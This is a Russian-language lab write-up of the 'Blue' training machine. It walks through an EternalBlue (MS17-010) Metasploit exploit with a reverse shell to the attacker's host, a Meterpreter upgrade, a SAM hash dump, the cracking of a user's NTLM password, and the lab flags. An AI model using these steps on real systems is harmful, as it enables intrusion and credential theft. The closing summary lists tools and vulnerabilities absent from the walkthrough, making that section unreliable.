# VulnHub - Blue

📅 Дата: 2025-07-02  
🧠 Сложность: easy  
💻 IP-адрес: 10.10.67.181  

---

## 🔍 Сканирование

### nmap
```bash
export ip=10.10.67.181
sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
```

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


---

## 🕵️ Enumeration

### SMB
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
└─$ sudo nmap -p 445 --script "smb* and not brute" -Pn -sV -T4 --min-rate 5000 $ip
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 03:15 EDT
Nmap scan report for 10.10.67.181
Host is up (0.22s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-mbenum: 
|   Master Browser
|     JON-PC  6.1  
|   Potential Browser
|     JON-PC  6.1  
|   Server service
|     JON-PC  6.1  
|   Windows NT/2000/XP/2003 server
|     JON-PC  6.1  
|   Workstation
|_    JON-PC  6.1  
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.67.181\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.67.181\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.67.181\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-02T02:15:18-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-02T07:15:18
|_  start_date: 2025-07-02T06:15:53
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-print-text: false
|_smb-vuln-ms10-054: false
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
|_smb-flood: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.09 seconds
```


## 📂 Получение доступа

Нахожу эксплойт в msfconsole
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
└─$ msfconsole                                                 

Metasploit Documentation: https://docs.metasploit.com/

msf6 > setg RHOSTS 10.10.67.181
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

...

msf6 > use 0
msf6 > set LHOST 10.21.104.16
msf6 > run
```

Меняю payload
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.67.181     yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                             ploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affect
                                             s Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Получил сессию, перевёл в background
```bash
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 2? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

## ⚙️ Привилегии

Нахожу shell to meterpreter
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search post shell to meterpreter

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/linux/http/glinet_unauth_rce_cve_2023_50445         2023-12-10       excellent  Yes    GL.iNet Unauthenticated Remote Command Execution via the logread module.
   1     \_ target: Unix Command                                   .                .          .      .
   2     \_ target: Linux Dropper                                  .                .          .      .
   3   post/multi/gather/multi_command                             .                normal     No     Multi Gather Run Shell Command Resource File
   4   post/multi/gather/ubiquiti_unifi_backup                     .                normal     No     Multi Gather Ubiquiti UniFi Controller Backup
   5   post/multi/recon/local_exploit_suggester                    .                normal     No     Multi Recon Local Exploit Suggester
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7     \_ target: Automatic                                      .                .          .      .
   8     \_ target: Unix/OSX/Linux                                 .                .          .      .
   9     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   10    \_ target: Windows (CMD)                                  .                .          .      .
   11  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
   12    \_ target: Python                                         .                .          .      .
   13    \_ target: PHP                                            .                .          .      .
   14    \_ target: PSH                                            .                .          .      .
   15    \_ target: Regsvr32                                       .                .          .      .
   16    \_ target: pubprn                                         .                .          .      .
   17    \_ target: SyncAppvPublishingServer                       .                .          .      .
   18    \_ target: PSH (Binary)                                   .                .          .      .
   19    \_ target: Linux                                          .                .          .      .
   20    \_ target: Mac OS X                                       .                .          .      .
   21  post/multi/manage/shell_to_meterpreter                      .                normal     No     Shell to Meterpreter Upgrade                                                                                                    
   22  post/windows/manage/powershell/exec_powershell              .                normal     No     Windows Manage PowerShell Download and/or Execute
   23  post/windows/manage/exec_powershell                         .                normal     No     Windows Powershell Execution Post Module
```

Для работы модуля нужен параметр SESSION
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use 21
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
                                       auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```

Устанавливаю и запускаю
```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                               Connection
  --  ----  ----               -----------                               ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.21.104.16:4444 -> 10.10.67.181:49273
                                6.1.7601] -----                          (10.10.67.181)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
                                       auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  2                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > run
```

Получаю Meterpreter
```bash
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.21.104.16:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (201798 bytes) to 10.10.67.181
[*] Meterpreter session 3 opened (10.21.104.16:4433 -> 10.10.67.181:49289) at 2025-07-02 03:57:54 -0400
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.21.104.16:4444 -> 10.10.67.181:492
                                     ion 6.1.7601] -----                    73 (10.10.67.181)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC           10.21.104.16:4433 -> 10.10.67.181:492
                                                                            89 (10.10.67.181)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > 
```

Подтверждаю получение root:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2284 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Нахожу процесс запущенный от SYSTEM:
```bash
C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 416   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   668   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 484   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 488   568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 492   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 568   560   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 616   560   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 628   608   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 668   608   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 716   616   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 724   616   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 732   616   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 772   716   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 844   716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 912   716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 960   716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 1116  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 1200  716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 1268  716   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1328  1268  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1372  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 1452  716   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-
             xe                                                               ssm-agent.exe
 1532  716   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\Li
                                                                              teAgent.exe
 1620  1292  powershell.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShe
                                                                              ll\v1.0\powershell.exe
 1688  716   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigSe
                                                                              rvice\Ec2Config.exe
 1984  716   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 2080  844   WmiPrvSE.exe
 2228  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2284  1620  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 2316  716   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 2416  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2556  716   vds.exe             x64   0        NT AUTHORITY\SYSTEM
 2608  716   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 2680  716   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM
 3044  716   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM
```

Выполняю миграцию в spoolsv.exe:
```bash
meterpreter > migrate 1268
[*] Migrating from 1620 to 1268...
[*] Migration completed successfully.
meterpreter > 
```

hashdump
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Взламываю NTLM hash:
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
└─$ cat hash_Jon.txt 
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
└─$ hashcat -m 1000 -a 0  hash_Jon.txt /media/sf_Exchange/Dictionaries/rockyou.txt

┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/exploits]
└─$ hashcat -m 1000 -a 0  hash_Jon.txt --show                                     
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

Ищу в системе флаги:
```bash
meterpreter > search -f *flag*
Found 6 results...
==================

Path                                                             Size (bytes)  Modified (UTC)
----                                                             ------------  --------------
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-17 15:26:42 -0400
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-17 15:30:04 -0400
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-17 15:32:52 -0400
c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-17 15:26:36 -0400
c:\Windows\System32\config\flag2.txt                             34            2019-03-17 15:32:48 -0400
c:\flag1.txt                                                     24            2019-03-17 15:27:21 -0400
```

И читаю их:
```bash
meterpreter > cat c:\\flag1.txt
```


## 🏁 Флаги

- flag1:flag{access_the_machine} 
- flag2:flag{sam_database_elevated_access} 
- flag3:flag{admin_documents_can_be_valuable} 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


